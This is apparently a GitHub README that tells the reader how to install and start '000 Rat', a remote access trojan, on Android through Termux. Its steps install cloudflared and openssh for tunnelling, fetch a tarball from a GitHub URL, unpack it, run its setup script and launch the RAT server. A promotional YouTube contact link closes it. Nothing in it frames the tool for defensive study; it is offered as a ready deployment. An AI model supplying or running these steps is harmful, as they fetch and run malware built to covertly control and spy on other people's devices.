# 000 Rat Installation on Android via Termux (2026)
<h1 align="center">
  <a href="httpsNlE">🎥 Full set-up Demo Video</a>
</h1>

## 📦 Installation Commands

Copy and paste the following commands one by one:

# Update all packages
```
apt update && apt upgrade -y
```
```
pkg install wget cloudflared openssh git -y
```
```
wget https://github.com/debzero/000_Rat/raw/refs/heads/main/000_RAT.tar.gz
```

# Setup Comands
```
tar -xzvf 000_RAT.tar.gz;
rm 000_RAT.tar.gz;
```
```
cd 000_rat && bash setup.sh
```
# Server Start Type 000
```
000
```

## 📌 Contact Me  

<a href="https://youtube.com/@zeroxploid">
  <img src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube">
</a>
